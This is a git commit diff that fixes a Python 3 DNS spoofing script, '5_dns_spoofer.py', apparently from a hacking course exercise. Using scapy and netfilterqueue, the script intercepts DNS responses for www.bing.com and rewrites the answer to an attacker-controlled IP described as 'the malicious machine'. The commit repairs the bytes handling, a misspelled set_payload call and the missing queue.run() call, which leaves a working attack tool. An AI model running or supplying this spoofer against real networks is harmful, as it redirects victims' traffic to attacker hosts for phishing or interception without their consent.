96e71d4aa5aa6d353f443dfa010578f0d63b2f4f
m-sumaim <alsumaim960@gmail.com>
2026-01-15 23:42:14 +0530

    dns python3 update

--- 5_dns_spoofer.py
+++ 5_dns_spoofer.py
@@ -6,7 +6,7 @@ def process_packet(packet):
 		scapy_packet = scapy.IP(packet.get_payload())
 		if scapy_packet.haslayer(scapy.DNSRR):               # using layers find out if DNS Response is found
 				qname = scapy_packet[scapy.DNSQR].qname
-				if "www.bing.com" in qname:
+				if "www.bing.com" in qname.decode():          # FIX 1: bytes → string
 						print("[+] Spoofing target")
 						answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")     # here the IP is the malicious machine
 						scapy_packet[scapy.DNS].an = answer              # create a spoofed answer
@@ -17,10 +17,10 @@ def process_packet(packet):
 						del scapy_packet[scapy.UDP].len                   # delete length from UDP layer
 						del scapy_packet[scapy.UDP].chksum                # delete checksumfrom UDP layer
 						
-						packet.set_paylaod(str(scapy_packet))
+						packet.set_payload(bytes(scapy_packet))           # FIX 2: string → bytes
 						
 		packet.accept()                          # to enable packet forwarding to destination
 
 queue = netfilterqueue.NetfilterQueue()
 queue.bind(0, process_packet)                 # since process_packet is a callback function, no need to pass arguments, as NetFilterQueue will automatically pass every packet automatically
-queue.run
+queue.run()
